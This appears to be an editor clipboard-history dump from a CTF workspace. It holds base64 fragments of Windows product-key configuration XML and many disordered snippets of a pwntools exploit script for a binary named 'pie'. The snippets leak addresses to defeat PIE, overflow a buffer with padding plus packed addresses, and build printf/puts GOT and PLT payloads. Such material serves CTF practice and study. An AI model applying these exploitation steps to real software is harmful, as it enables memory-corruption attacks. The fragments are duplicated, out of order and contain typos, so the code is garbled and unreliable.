gkJCTxwa2M6U3RhcnQ+OTQ2Njc0NDU0PC9wa2M6U3RhcnQ+DQoJCQk8cGtjOkVuZD45NDY2NzY0NTM8L3BrYzpFbmQ+DQoJCTwvcGtjOktleVJhbmdlPjxwa2M6S2V5UmFuZ2U+DQoJCQk8cGtjOlJlZkFjdENvbmZpZ0lkPns3MWM3Yzg1MS0xODYzLTQyMzItOGFjMi1jZGQ3ZjVlNDVkYWV9PC9wa2M6UmVmQWN0Q29uZmlnSWQ+DQoJCQk8cGtjOlBhcnROdW1iZXI+WDE1LTM5NzM1PC9wa2M6UGFydE51bWJlcj4NCgkJCTxwa2M6RXVsYVR5cGU+UmV0YWlsPC9wa2M6RXVsYVR5cGU+DQoJCQk8cGtjOklzVmFsaWQ+dHJ1ZTwvcGtjOklzVmFsaWQ+DQoJCQk8cGtjOlN0YXJ0Pjk0NjY3NjQ1NDwvcGtjOlN0YXJ0Pg0KCQkJPHBrYzpFbmQ+OTQ2Njc3NDUzPC9wa2M6RW5kPg0KCQk8L3BrYzpLZXlSYW5nZT48cGtjOktleVJhbmdlPg0KCQkJPHBrYzpSZWZBY3RDb25maWdJZD57ZDE4ODgyMGEtY2I2My00YmFkLWE5Y
81fa798e5ae81923ed4f93cae5a28498|file:///home/neo/ccsc/royal-huntsman/strings.txt|30278|1|V|text
	29uZmlnSWQ+DQoJCQk8cGtjOlBhcnROdW1iZXI+WDE1LTM5NzI2PC9wa2M6UGFydE51bWJlcj4NCgkJCTxwa2M6RXVsYVR5cGU+UmV0YWlsPC9wa2M6RXVsYVR5cGU+DQoJCQk8cGtjOklzVmFsaWQ+dHJ1ZTwvcGtjOklzVmFsaWQ+DQoJCQk8cGtjOlN0YXJ0Pjg0NzM4MDAwMDwvcGtjOlN0YXJ0Pg0KCQkJPHBrYzpFbmQ+ODQ3MzgxOTk5PC9wa2M6RW5kPg0KCQk8L3BrYzpLZXlSYW5nZT48cGtjOktleVJhbmdlPg0KCQkJPHBrYzpSZWZBY3RDb25maWdJZD57ZTgzOGQ5NDMtNjNlZC00YTBiLTlmYjEtNDcxNTI5MDhhY2M5fTwvcGtjOlJlZkFjdENvbmZpZ0lkPg0KCQkJPHBrYzpQYXJ0TnVtYmVyPlgxNS0zOTcyNzwvcGtjOlBhcnROdW1iZXI+DQoJCQk8cGtjOkV1bGFUeXBlPlJldGFpbDwvcGtjOkV1bGFUeXBlPg0KCQkJPHBrYzpJc1ZhbGlkPnRydWU8L3BrYzpJc1ZhbGlkPg0KCQkJPHBrYzpTdGFydD44NDczODIwMDA8L3BrYzpTdGFydD4NCgkJCTxwa2M6RW5kPjg0NzM4Mjk5OTwvcGtjOkVuZD4NCgkJPC9wa2M6S2V5UmFuZ2U+PHBrYzpLZXlSYW5nZT4NCgkJCTxwa2M6UmVmQWN0Q29uZmlnSWQ+e2IxMTg0OTgyLWE5NTgtNDY0My04ZTY2LTQ0NWZhMGY5MjgzMn08L3BrYzpSZWZBY3RDb25maWdJZD4NCgkJCTxwa2M6UGFydE51bWJlcj5YMTUtMzk3Mjg8L3BrYzpQYXJ0TnVtYmVyPg0KCQkJPHBrYzpFdWxhVHlwZT5SZXRhaWw8L3BrYzpFdWxhVHlwZT4NCgkJCTxwa2M6SXNWYWxpZD50cnVlPC9wa2M6SXNWYWxpZD4NCgkJCTxwa2M6U3RhcnQ+OTI4MTE0NDAwPC9wa2M6U3RhcnQ+DQoJCQk8cGtjOkVuZD45MjgxMTYzOTk8L3BrYzpFbmQ+DQoJCTwvcGtjOktleVJhbmdlPjxwa2M6S2V5UmFuZ2U+DQoJCQk8cGtjOlJlZkFjdENvbmZpZ0lkPntiMTE4NDk4Mi1hOTU4LTQ2NDMtOGU2Ni00NDVmYTBmOTI4MzJ9PC9wa2M6UmVmQWN0Q29uZmlnSWQ+DQoJCQk8cGtjOlBhcnROdW1iZXI+WDE1LTM5NzI5PC9wa2M6UGFydE51bWJlcj4NCgkJCTxwa2M6RXVsYVR5cGU+UmV0YWlsPC9wa2M6RXVsYVR5cGU+DQoJCQk8cGtjOklzVmFsaWQ+dHJ1ZTwvcGtjOklzVmFsaWQ+DQoJCQk8cGtjOlN0YXJ0PjkyODExNjQwMDwvcGtjOlN0YXJ0Pg0KCQkJPHBrYzpFbmQ+OTI4MTE3Mzk5PC9wa2M6RW5kPg0KCQk8L3BrYzpLZXlSYW5nZT48cGtjOktleVJhbmdlPg0KCQkJPHBrYzpSZWZBY3RDb25maWdJZD57MmU3ZDA2MGQtNDcxNC00MGYyLTk4OTYtMWU0ZjE1YjYxMmFkfTwvcGtjOlJlZkFjdENvbmZpZ0lkPg0KCQkJPHBrYzpQYXJ0TnVtYmVyPlgxNS0zOTczMDwvcGtjOlBhcnROdW1iZXI+DQoJCQk8cGtjOkV1bGFUeXBlPlJldGFpbDwvcGtjOkV1bGFUeXBlPg0KCQkJPHBrYzpJc1ZhbGlkPnRydWU8L3BrYzpJc1ZhbGlkPg0KCQkJPHBrYzpTdGFydD44OTEyNzQwMDA8L3BrYzpTdGFydD4NCgkJCTxwa2M6RW5kPjg5MTI3Njk5OTwvcGtjOkVuZD4NCgkJPC9wa2M6S2V5UmFuZ2U+PHBrYzpLZXlSYW5nZT4NCgkJCTxwa2M6UmVmQWN0Q29uZmlnSWQ+ezJlN2QwNjBkLTQ3MTQtNDBmMi05ODk2LTFlNGYxNWI2MTJhZH08L3BrYzpSZWZBY3RDb25maWdJZD4NCgkJCTxwa2M6UGFydE51bWJlcj5YMTUtMzk3MzE8L3BrYzpQYXJ0TnVtYmVyPg0KCQkJPHBrYzpFdWxhVHlwZT5SZXRhaWw8L3BrYzpFdWxhVHlwZT4NCgkJCTxwa2M6SXNWYWxpZD50cnVlPC9wa2M6SXNWYWxpZD4NCgkJCTxwa2M6U3RhcnQ+ODkxMjc3MDAwPC9wa2M6U3RhcnQ+DQoJCQk8cGtjOkVuZD44OTEyNzc5OTk8L3BrYzpFbmQ+DQoJCTwvcGtjOktleVJhbmdlPjxwa2M6S2V5UmFuZ2U+DQoJCQk8cGtjOlJlZkFjdENvbmZpZ0lkPnthYzk2ZTFhOC02Y2M0LTQzMTAtYTRmZi0zMzJjZTc3ZmI1Yjh9PC9wa2M6UmVmQWN0Q29uZmlnSWQ+DQoJCQk8cGtjOlBhcnROdW1iZXI+WDE1LTM5NzMyPC9wa2M6UGFydE51bWJlcj4NCgkJCTxwa2M6RXVsYVR5cGU+UmV0YWlsPC9wa2M6RXVsYVR5cGU+DQoJCQk8cGtjOklzVmFsaWQ+dHJ1ZTwvcGtjOklzVmFsaWQ+DQoJCQk8cGtjOlN0YXJ0Pjk1NTA0MTQwMDwvcGtjOlN0YXJ0Pg0KCQkJPHBrYzpFbmQ+OTU1MDUxMzk5PC9wa2M6RW5kPg0KCQk8L3BrYzpLZXlSYW5nZT48cGtjOktleVJhbmdlPg0KCQkJPHBrYzpSZWZBY3RDb25maWdJZD57YWM5NmUxYTgtNmNjNC00MzEwLWE0ZmYtMzMyY2U3N2ZiNWI4fTwvcGtjOlJlZkFjdENvbmZpZ0lkPg0KCQkJPHBrYzpQYXJ0TnVtYmVyPlgxNS0zOTczMzwvcGtjOlBhcnROdW1iZXI+DQoJCQk8cGtjOkV1bGFUeXBlPlJldGFpbDwvcGtjOkV1bGFUeXBlPg0KCQkJPHBrYzpJc1ZhbGlkPnRydWU8L3BrYzpJc1ZhbGlkPg0KCQkJPHBrYzpTdGFydD45NTUwNzkwMDA8L3BrYzpTdGFydD4NCgkJCTxwa2M6RW5kPjk1NTA4MDk5OTwvcGtjOkVuZD4NCgkJPC9wa2M6S2V5UmFuZ2U+PHBrYzpLZXlSYW5nZT4NCgkJCTxwa2M6UmVmQWN0Q29uZmlnSWQ+ezcxYzdjODUxLTE4NjMtNDIzMi04YWMyLWNkZDdmNWU0NWRhZX08L3BrYzpSZWZBY3RDb25maWdJZD4NCgkJCTxwa2M6UGFydE51bWJlcj5YMTUtMzk3MzQ8L3BrYzpQYXJ0TnVtYmVyPg0KCQkJPHBrYzpFdWxhVHlwZT5SZXRhaWw8L3BrYzpFdWxhVHlwZT4NCgkJCTxwa2M6SXNWYWxpZD50cnVlPC9wa2M6SXNWYWxpZD4NCgkJCTxwa2M6U3RhcnQ+OTQ2Njc0NDU0PC9wa2M6U3RhcnQ+DQoJCQk8cGtjOkVuZD45NDY2NzY0NTM8L3BrYzpFbmQ+DQoJCTwvcGtjOktleVJhbmdlPjxwa2M6S2V5UmFuZ2U+DQoJCQk8cGtjOlJlZkFjdENvbmZpZ0lkPns3MWM3Yzg1MS0xODYzLTQyMzItOGFjMi1jZGQ3ZjVlNDVkYWV9PC9wa2M6UmVmQWN0Q29uZmlnSWQ+DQoJCQk8cGtjOlBhcnROdW1iZXI+WDE1LTM5NzM1PC9wa2M6UGFydE51bWJlcj4NCgkJCTxwa2M6RXVsYVR5cGU+UmV0YWlsPC9wa2M6RXVsYVR5cGU+DQoJCQk8cGtjOklzVmFsaWQ+dHJ1ZTwvcGtjOklzVmFsaWQ+DQoJCQk8cGtjOlN0YXJ0Pjk0NjY3NjQ1NDwvcGtjOlN0YXJ0Pg0KCQkJPHBrYzpFbmQ+OTQ2Njc3NDUzPC9wa2M6RW5kPg0KCQk8L3BrYzpLZXlSYW5nZT48cGtjOktleVJhbmdlPg0KCQkJPHBrYzpSZWZBY3RDb25maWdJZD57ZDE4ODgyMGEtY2I2My00YmFkLWE5Y
0e74614f0a2fa980c902318a7a72e57a|file:///home/neo/ccsc/royal-huntsman/strings.txt|30279|1|V|text
	
e02b547bea49b88c902323d8c0f1494d|file:///home/neo/ccsc/royal-huntsman/strings.txt|35524|1|V|text
	PlgxNS0zNDYxODwvcGtjOlBhcnROdW1iZXI+DQoJCQk8cGtjOkV1bGFUeXBlPlJldGFpbDwvcGtjOkV1bGFUeXBlPg0KCQkJPHBrYzpJc1ZhbGlkPnRydWU8L3BrYzpJc1ZhbGlkPg0KCQkJPHBrYzpTdGFydD4xNjQyNDAwMDA8L3BrYzpTdGFydD4NCgkJCTxwa2M6RW5kPjE2NDM4OTk5OTwvcGtjOkVuZD4NCgkJPC9wa2M6S2V5UmFuZ2U+PHBrYzpLZXlSYW5nZT4NCgkJCTxwa2M6UmVmQWN0Q29uZmlnSWQ+ezFkNjNhZTAwLTc3MzMtNGU0Ni1iMGQwLWFlMGFiODFkNzYzOH08L3BrYzpSZWZBY3RDb25maWdJZD4NCgkJCTxwa2M6UGFydE51bWJlcj5YMTUtMzQ2MzA8L3BrYzpQYXJ0TnVtYmVyPg0KCQkJPHBrYzpFdWxhVHlwZT5PRU08L3BrYzpFdWxhVHlwZT4NCgkJCTxwa2M6SXNWYWxpZD50cnVlPC9wa2M6SXNWYWxpZD4NCgkJCTxwa2M6U3RhcnQ+MTY3MDAwMDAwPC9wa2M6U3RhcnQ+DQoJCQk8cGtjOkVuZD4xNzA5OTk5OTk8L3BrYzpFbmQ+DQoJCTwvcGtjOktleVJhbmdlPjxwa2M6S2V5UmFuZ2U+DQoJCQk8cGtjOlJlZkFjdENvbmZpZ0lkPntiNDFkZjUxMi04NDVkLTQzODQtYTJkNy1hY2UzZjc3OGJmZjV9PC9wa2M6UmVmQWN0Q29uZmlnSWQ+DQoJCQk8cGtjOlBhcnROdW1iZXI+WDE1LTM0NjUwPC9wa2M6UGFydE51bWJlcj4NCgkJCTxwa2M6RXVsYVR5cGU+T0VNPC9wa2M6RXVsYVR5cGU+DQoJCQk8cGtjOklzVmFsaWQ+dHJ1ZTwvcGtjOklzVmFsaWQ+DQoJCQk8cGtjOlN0YXJ0PjEwMDU1MDA8L3BrYzpTdGFydD4NCgkJCTxwa2M6RW5kPjEwMDc5OTk8L3BrYzpFbmQ+DQoJCTwvcGtjOktleVJhbmdlPjxwa2M6S2V5UmFuZ2U+DQoJCQk8cGtjOlJlZkFjdENvbmZpZ0lkPnsxZDYzYWUwMC03NzMzLTRlNDYtYjBkMC1hZTBhYjgxZDc2Mzh9PC9wa2M6UmVmQWN0Q29uZmlnSWQ+DQoJCQk8cGtjOlBhcnROdW1iZXI+WDE1LTM0NjMyPC9wa2M6UGFydE51bWJlcj4NCgkJCTxwa2M6RXVsYVR5cGU+T0VNPC9wa2M6RXVsYVR5cGU+DQoJCQk8cGtjOklzVmFsaWQ+dHJ1ZTwvcGtjOklzVmFsaWQ+DQoJCQk8cGtjOlN0YXJ0PjE5OTAwMDAwMDwvcGtjOlN0YXJ0Pg0KCQkJPHBrYzpFbmQ+MTk5NzQ5OTk5PC9wa2M6RW5kPg0KCQk8L3BrYzpLZXlSYW5nZT48cGtjOktleVJhbmdlPg0KCQkJPHBrYzpSZWZBY3RDb25maWdJZD57ZTFmMGJiNWItMjQyMS00YjdjLTgxYTEtMDM2NDMxMDY0MjFkfTwvcGtjOlJlZkFjdENvbmZpZ0lkPg0KCQkJPHBrYzpQYXJ0TnVtYmVyPlgxNS0zNDYxOTpWaXJ0dWFsPC9wa2M6UGFydE51bWJlcj4NCgkJCTxwa2M6RXVsYVR5cGU+UmV0YWlsPC9wa2M6RXVsYVR5cGU+DQoJCQk8cGtjOklzVmFsaWQ+dHJ1ZTwvcGtjOklzVmFsaWQ+DQoJCQk8cGtjOlN0YXJ0PjE2NDM5MDAwMDwvcGtjOlN0YXJ0Pg0KCQkJPHBrYzpFbmQ+MTY0NTM5OTk5PC9wa2M6RW5kPg0KCQk8L3BrYzpLZXlSYW5nZT48cGtjOktleVJhbmdlPg0KCQkJPHBrYzpSZWZBY3RDb25maWdJZD57MWQ2M2FlMDAtNzczMy00ZTQ2LWIwZDAtYWUwYWI4MWQ3NjM4fTwvcGtjOlJlZkFjdENvbmZpZ0lkPg0KCQkJPHBrYzpQYXJ0TnVtYmVyPlgxNS0zNDYzMTpWaXJ0dWFsPC9wa2M6UGFydE51bWJlcj4NCgkJCTxwa2M6RXVsYVR5cGU+T0VNPC9wa2M6RXVsYVR5cGU+DQoJCQk8cGtjOklzVmFsaWQ+dHJ1ZTwvcGtjOklzVmFsaWQ+DQoJCQk8cGtjOlN0YXJ0PjE3MTAwMDAwMDwvcGtjOlN0YXJ0Pg0KCQkJPHBrYzpFbmQ+MTc0OTk5OTk5PC9wa2M6RW5kPg0KCQk8L3BrYzpLZXlSYW5nZT48cGtjOktleVJhbmdlPg0KCQkJPHBrYzpSZWZBY3RDb25maWdJZD57YjQxZGY1MTItODQ1ZC00Mzg0LWEyZDctYWNlM2Y3NzhiZmY1fTwvcGtjOlJlZkFjdENvbmZpZ0lkPg0KCQkJPHBrYzpQYXJ0TnVtYmVyPlgxNS0zNDY1MTpWaXJ0dWFsPC9wa2M6UGFydE51bWJlcj4NCgkJCTxwa2M6RXVsYVR5cGU+T0VNPC9wa2M6RXVsYVR5cGU+DQoJCQk8cGtjOklzVmFsaWQ+dHJ1ZTwvcGtjOklzVmFsaWQ+DQoJCQk8cGtjOlN0YXJ0PjEwMDgwMDA8L3BrYzpTdGFydD4NCgkJCTxwa2M6RW5kPjEwMTA0OTk8L3BrYzpFbmQ+DQoJCTwvcGtjOktleVJhbmdlPjxwa2M6S2V5UmFuZ2U+DQoJCQk8cGtjOlJlZkFjdENvbmZpZ0lkPnsxZDYzYWUwMC03NzMzLTRlNDYtYjBkMC1hZTBhYjgxZDc2Mzh9PC9wa2M6UmVmQWN0Q29uZmlnSWQ+DQoJCQk8cGtjOlBhcnROdW1iZXI+WDE1LTM0NjMzOlZpcnR1YWw8L3BrYzpQYXJ0TnVtYmVyPg0KCQkJPHBrYzpFdWxhVHlwZT5PRU08L3BrYzpFdWxhVHlwZT4NCgkJCTxwa2M6SXNWYWxpZD50cnVlPC9wa2M6SXNWYWxpZD4NCgkJCTxwa2M6U3RhcnQ+MTc1MDAwMDAwPC9wa2M6U3RhcnQ+DQoJCQk8cGtjOkVuZD4xNzU3NDk5OTk8L3BrYzpFbmQ+DQoJCTwvcGtjOktleVJhbmdlPjxwa2M6S2V5UmFuZ2U+DQoJCQk8cGtjOlJlZkFjdENvbmZpZ0lkPntlMWYwYmI1Yi0yNDIxLTRiN2MtODFhMS0wMzY0MzEwNjQyMWR9PC9wa2M6UmVmQWN0Q29uZmlnSWQ+DQoJCQk8cGtjOlBhcnROdW1iZXI+WDE1LTM0NjE3OlZpcnR1YWw8L3BrYzpQYXJ0TnVtYmVyPg0KCQkJPHBrYzpFdWxhVHlwZT5SZXRhaWw8L3BrYzpFdWxhVHlwZT4NCgkJCTxwa2M6SXNWYWxpZD50cnVlPC9wa2M6SXNWYWxpZD4NCgkJCTxwa2M6U3RhcnQ+MTY0MDAwMDAwPC9wa2M6U3RhcnQ+DQoJCQk8cGtjOkVuZD4xNjQyMzk5OTk8L3BrYzpFbmQ+DQoJCTwvcGtjOktleVJhbmdlPjxwa2M6S2V5UmFuZ2U+DQoJCQk8cGtjOlJlZkFjdENvbmZpZ0lkPns3NDgyZTYxYi1jNTg5LTRiN2YtOGVjYy00NmQ0NTVhYzNiODd9PC9wa2M6UmVmQWN0Q29uZmlnSWQ+DQoJCQk8cGtjOlBhcnROdW1iZXI+WDE1LTM0ODE4PC9wa2M6UGFydE51bWJlcj4NCgkJCTxwa2M6RXVsYVR5cGU+Vm9sdW1lPC9wa2M6RXVsYVR5cGU+DQoJCQk8cGtjOklzVmFsaWQ+dHJ1ZTwvcGtjOklzVmFsaWQ+DQoJCQk8cGtjOlN0YXJ0PjEwMDAxMjg8L3BrYzpTdGFydD4NCgkJCTxwa2M6RW5kPjEwMDAxMzg8L3BrYzpFbmQ+DQoJCTwvcGtjOktleVJhbmdlPjxwa2M6S2V5UmFuZ2U+DQoJCQk8cGtjOlJlZkFjdENvbmZpZ0lkPntjMGM5N2IwNS1lNzFhLTRmZTQtYjIzNC00MTY1Zjk2MjUwZjZ9PC9w
ae983de279f4b8c4a488ba8b4e99ffc9|file:///home/neo/ccsc/pie/exploit.py|92|1|V|python
	leaked_addr = int("0x" + toHexAddr(leaked[:4]), 16)
095a1b43effec73955e31e790438de49|file:///home/neo/ccsc/pie/exploit.py|97|11|v|python
	Base
1e5137308a07322a0405e5300566f0d8|file:///home/neo/ccsc/pie/exploit.py|97|28|v|python
	be_addr
1e4b863d4ae217b74cb4276b465d7c22|file:///home/neo/ccsc/pie/exploit.py|86|1|V|python
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	io.sendline("A" * 31)
	line = io.recvline_contains("Got this:")
	leaked = io.recvline()
a659fac6943993cb5fcb521575cfcbd0|file:///home/neo/ccsc/pie/exploit.py|103|1|V|python
	leaked = io.recvline()
46a5ffb45729e62d2693144e15cf7f42|file:///home/neo/ccsc/pie/exploit.py|101|1|V|python
	io.sendline("A" * 60 + p32(print_pie_addr))
7ae58b191382821dafd19ca64737ec0c|file:///home/neo/ccsc/pie/exploit.py|102|1|v|python
	io.sendline
a413b54ec4b38af16a6153ac9548a26f|file:///home/neo/ccsc/pie/exploit.py|103|26|^v|python
	"A" * 60 + p32(print_pie_addr)
f9375fe373caaf994e0a340766cffe77|file:///home/neo/ccsc/pie/exploit.py|102|1|V|python
	payload = "A" * 60 + p32(print_pie_addr)
c18603790142a239c6887d80bf55e599|file:///home/neo/ccsc/pie/exploit.py|102|13|v|python
	"A" * 48 + p32(print_pie_addr)
ee7d02324cdb2205cc9696df6f8178a9|file:///home/neo/ccsc/pie/exploit.py|104|1|V|python
	line = io.recvline_contains("Got this:")
593086306455b3b5aa2c837fec6c4a32|file:///home/neo/ccsc/pie/exploit.py|103|1|V|python
	# log.info("Payload: %#x" % print_pie_addr)
44d15cb93f51471a11a976a9ff1ce279|file:///home/neo/ccsc/pie/exploit.py|95|1|V|python
	log.info("Leaked addr: %#x" % print_pie_addr)
fc92d2beb916818c43021ed76a2842dc|file:///home/neo/ccsc/pie/exploit.py|95|11|v|python
	Lakwd
f8c7a22da040c0b40410a704bf43cbea|file:///home/neo/ccsc/pie/exploit.py|104|11|v|python
	Base addr: %#x
0bd1fc5603c66274f08b1e487812a0be|file:///home/neo/ccsc/pie/exploit.py|103|1|v|python
	leaked
001939435c1ccfc6b17862d6f55cd4d3|file:///home/neo/ccsc/pie/exploit.py|83|1|V|python
	# line = io.recvuntil("Please enter an option from the main menu:")
	# io.sendline('1')
43c5ca8016c2ea294ecd6c0e3c9bb350|file:///home/neo/ccsc/pie/exploit.py|100|1|V|python
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	payload = "A" * 48 + p32(print_pie_addr)
	io.sendline(payload)
	line = io.recvline_contains("Got this:")
	line = io.recvline()
255d93c9290ccc9d400db09edece581f|file:///home/neo/ccsc/pie/exploit.py|85|1|V|python
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
4997652f91c2332f6b0de229a35bacac|file:///home/neo/ccsc/pie/exploit.py|84|28|v|python
	print_pie
bb78cc97c44804646374bb72e4689022|file:///home/neo/ccsc/pie/exploit.py|97|1|V|python
	log.info("Print pie addr: %#x" % print_pie_addr)
7e41895f70538fcf88dc3f56e2803032|file:///home/neo/ccsc/pie/exploit.py|124|1|V|python
	# io.sendline(cyclic(1000))
87a4a3f5f42af34519b8c616f7611ebc|file:///home/neo/ccsc/pie/exploit.py|113|1|V|python
	# line = io.recvuntil("Please enter an option from the main menu:")
	# io.sendline('2')
	# line = io.recvuntil("Give me your pie:")
	# payload = "A" * 48 + p32(print_pie_addr)
	# io.sendline(payload)
	# line = io.recvline_contains("Got this:")
	# line = io.recvline()
	
	# line = io.recvline()
	# log.info("Received: %s" % line)
2aa74ff176bd8cb23b76778fc99f8732|file:///home/neo/ccsc/pie/exploit.py|113|21|v|python
	 p32(printf_addr)
64edbcafb0d41dd412f47b72851a8bb3|file:///home/neo/ccsc/pie/exploit.py|103|1|V|python
	
	# line = io.recvuntil("Please enter an option from the main menu:")
	# io.sendline('2')
	# line = io.recvuntil("Give me your pie:")
	# payload = "A" * 32 + p32(print_pie_addr) + 
1c7036c661734bf20fa60b601bec1add|file:///home/neo/ccsc/pie/exploit.py|122|22|v|python
	p32(print_pie_addr)
ec131ecde5918ceb1243de9af4369aff|file:///home/neo/ccsc/pie/exploit.py|123|1|V|python
	payload += p32(print_pie_addr)
8156b420bd4b2c5e36dafe468ec28048|file:///home/neo/ccsc/pie/exploit.py|124|16|v|python
	printf_addr
5749a37d57ec6a2929fca0eaa5746c2c|file:///home/neo/ccsc/pie/exploit.py|38|1|V|python
	tbreak main
	continue
6b9bba299b4f5b203608271b1f35b693|file:///home/neo/ccsc/pie/exploit.py|96|1|V|python
	# print_pie_addr = int("0x" + toHexAddr(leaked[:4]), 16)
5fc301ca2e39ec9be036b2f7093e3bd3|file:///home/neo/ccsc/pie/exploit.py|96|1|V|python
	print_pie_addr = u32(leaked[:4])
b1833f13cd175b6356028c727adc2020|file:///home/neo/ccsc/pie/exploit.py|97|1|v|python
	print_pie_addr
520e2cc09d2bbf28efd96fb0860519aa|file:///home/neo/ccsc/pie/exploit.py|98|1|V|python
	got_addr = int("0x" + toHexAddr(leaked[8:12]), 16)
64fbe159a601a7d5223854f249956085|file:///home/neo/ccsc/pie/exploit.py|87|1|V|python
	PRINTF_PLT = exe.plt["printf"]
6831dda892362eae854b801edff8b2ef|file:///home/neo/ccsc/pie/exploit.py|102|1|V|python
	log.info("Binary base addr: %#x" % base_addr)
3fc918cb8139526b92749de26991e674|file:///home/neo/ccsc/pie/exploit.py|103|11|v|python
	Binary base addr
b02878d7cd44bd91b4d2c264950cc90e|file:///home/neo/ccsc/pie/exploit.py|103|1|V|python
	log.info("Printf GOT: %#x" % PRINTF_GOT)
e3fd932d8f8abcab92a3a5fecdb4aba1|file:///home/neo/ccsc/pie/exploit.py|87|30|V|python
	PRINTF_PLT = exe.plt["printf"]
	PRINTF_GOT = exe.got["printf"]
a7a2ddcc58617e03e7a8341ea5e11b48|file:///home/neo/ccsc/pie/exploit.py|107|25|V|python
	printf_addr = base_addr + PRINTF_OFFSET
	log.info("Printf addr: %#x" % printf_addr)
09ccbad372f17c8a2979b2aeef59fbdd|file:///home/neo/ccsc/pie/exploit.py|101|1|V|python
	PRINTF_PLT = base_addr + exe.plt["printf"]
	PRINTF_GOT = base_addr + exe.got["printf"]
	log.info("Printf GOT: %#x" % PRINTF_GOT)
	log.info("Printf PLT: %#x" % PRINTF_PLT)
c0903a46fc6b8650c6b17f9fa461748f|file:///home/neo/ccsc/pie/exploit.py|105|1|v|python
	RINTF_PLT
b203ee8274eff60aa189d5fd278d62f9|file:///home/neo/ccsc/pie/exploit.py|106|1|v|python
	PRINTF_GOT
bbc54aed592ec55b12a24e8b0443a9d8|file:///home/neo/ccsc/pie/exploit.py|105|33|v|python
	pwrintf
afa0ff8b27b87666a6bde87251c5fde7|file:///home/neo/ccsc/pie/exploit.py|106|33|v|python
	printf
1661bb3daa0ea35b929032b65e9f648b|file:///home/neo/ccsc/pie/exploit.py|108|30|v|python
	PRINTF_PLT
f8102d3d771958cf824a8b33a0fb4f6d|file:///home/neo/ccsc/pie/exploit.py|110|1|V|python
	# log.info("GOT addr: %#x" % got_addr)
d58387d60431a5a5ce7217034a4425e3|file:///home/neo/ccsc/pie/exploit.py|111|1|V|python
	# Leak 
2332d59464562083b269d7349663c6ed|file:///home/neo/ccsc/pie/exploit.py|111|1|V|python
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	payload = "A" * 48 
	payload += p32(PUTS_GOT)
	io.sendline(payload)
	# line = io.recvline_contains("Got this:")
	line = io.recvline()
	log.info("Received: %s" % line)
	line = io.recvline()
	log.info("Received: %s" % line)
5b9e8b5fd0a317bdfd94d4294b675784|file:///home/neo/ccsc/pie/exploit.py|111|1|V|python
	# line = io.recvuntil("Please enter an option from the main menu:")
	# io.sendline('2')
5ee6107a60729b2b96a57f322e1aadab|file:///home/neo/ccsc/pie/exploit.py|125|1|V|python
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	payload = "A" * 48 
	payload += p32(print_pie_addr)
	payload += p32(base_addr)
	io.sendline(payload)
	line = io.recvline_contains("Got this:")
	line = io.recvline()
	
	line = io.recvline()
	log.info("Received: %s" % line)
10b952cdd7ad5bbcbac5d02806e64fd7|file:///home/neo/ccsc/pie/exploit.py|130|1|V|python
	payload += p32(base_addr)
a826704174f8948c63bb4ba55fcae65c|file:///home/neo/ccsc/pie/exploit.py|108|11|v|python
	Printf
7f453cc9da074e40ed9833145ac32939|file:///home/neo/ccsc/pie/exploit.py|120|2|V|python
	line = io.recvline()
	log.info("Received: %s" % line)
10cfd452abb8af1f400bec590b6a64bd|file:///home/neo/ccsc/pie/exploit.py|120|1|V|python
	ne = io.recvline()
	log.info("Received: %s" % line)
73d8dae15c910f163e5212ad5d0900d2|file:///home/neo/ccsc/pie/exploit.py|111|1|V|python
	# line = io.recvuntil("Please enter an option from the main menu:")
	# io.sendline('2')
	# line = io.recvuntil("Give me your pie:")
	# payload = "A" * 48 
	# payload += p32(PUTS_GOT)
	# io.sendline(payload)
	# # line = io.recvline_contains("Got this:")
	# line = io.recvline()
	# leaked = u32(leaked[:4])
	# log.info("Leaked puts@libc: %#x" % leaked)
	
31022863982b9482652532d156322c47|file:///home/neo/ccsc/pie/exploit.py|113|1|V|python
	# line = io.recvuntil("Please enter an option from the main menu:")
	# io.sendline('2')
	# line = io.recvuntil("Give me your pie:")
	# payload = "A" * 48 
	# payload += p32(print_pie_addr)
	# io.sendline(payload)
	# # line = io.recvline_contains("Got this:")
	# line = io.recvline()
	# log.info("Received: %s" % line)
28891c46050de5e96df8af50083a394b|file:///home/neo/ccsc/pie/exploit.py|117|1|V|python
	payload += p32(PUTS_PLT)
3b448426d22c8a327329a8ea2804de0d|file:///home/neo/ccsc/pie/exploit.py|104|1|V|python
	PRINTF_PLT = BINARY_BASE_ADDR + exe.plt["printf"]
c2f252932bb329d5746e05a9136db034|file:///home/neo/ccsc/pie/exploit.py|106|1|V|python
	log.info("Printf PLT: %#x" % PRINTF_PLT)
f36c8d5b3ba29801d87c9e077c97f6e1|file:///home/neo/ccsc/pie/exploit.py|107|1|V|python
	PUTS_PLT = BINARY_BASE_ADDR + exe.plt["puts"]
17bead04b88b9668c06911827932dd48|file:///home/neo/ccsc/pie/exploit.py|109|1|V|python
	log.info("Puts PLT: %#x" % PUTS_PLT)
425dcf2a15d573308c5580d68f4573f7|file:///home/neo/ccsc/pie/exploit.py|118|1|V|python
	# line = io.recvline_contains("Got this:")
889e32f68b4a444d7d33b053f6a21e59|file:///home/neo/ccsc/pie/exploit.py|118|11|v|python
	recvline()
f80fbe45474e8fec60e476762c12eafe|file:///home/neo/ccsc/pie/exploit.py|119|1|V|python
	line = io.recvuntil("Got this:")
6a2e7045985bd66c7bf02c20d11549ad|file:///home/neo/ccsc/pie/exploit.py|72|1|V|python
	    tbreak main
c0c44a1b05ccda60e39c770c11aacdda|file:///home/neo/ccsc/pie/exploit.py|72|5|V|python
	    continue
c6c45e3c1b9bb2c0e6146954eec0a7c6|file:///home/neo/ccsc/pie/exploit.py|113|16|v|python
	PUTS_GOT
c60ff5372acd735b51e77607d42ba9a2|file:///home/neo/ccsc/pie/exploit.py|113|1|V|python
	payload += p32(exe.symbols["puts"])
422a6d7a4cc0dfa9f8a8fba50eb871e0|file:///home/neo/ccsc/pie/exploit.py|115|1|V|python
	payload += p32(PUTS_GOT)
c38987ef45fb3f053b1d66704bdec389|file:///home/neo/ccsc/pie/exploit.py|97|1|V|python
	got_addr = u32(leaked[8:12])
b95045f99596144fb7dba374162a271f|file:///home/neo/ccsc/pie/exploit.py|113|1|V|python
